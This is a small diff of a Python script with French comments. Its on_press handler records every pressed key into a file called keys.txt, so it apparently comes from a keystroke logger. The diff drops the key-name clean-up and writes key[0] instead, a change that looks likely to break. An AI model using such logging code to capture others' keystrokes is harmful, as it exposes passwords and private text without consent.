@@ -153,21 +153,8 @@ def write_file(key) :
             f.write(key)
 
 def on_press(key) :
-    #On garde juste le nom de la touche, et  on supprime les " " et les [ ]
-    key = str(key)
-    key = key.replace("'", "")
-    if key == '""' :
-        key = "'"
-    key = key.replace("[", "")
-    if key == "" :
-        key = "["
-    key = key.replace("]", "")
-    if key == "" :
-        key = "]"
-    print(key)
-
     #On écrit la touche dans le fichier keys.txt
-    write_file(key)
+    write_file(key[0])
 
 #On fait la liste des caractères non supportés par windows
 messed_up_keys = ["é", "è", "à", "°", "^", "¨", "£", "¤", "ù", "µ"]
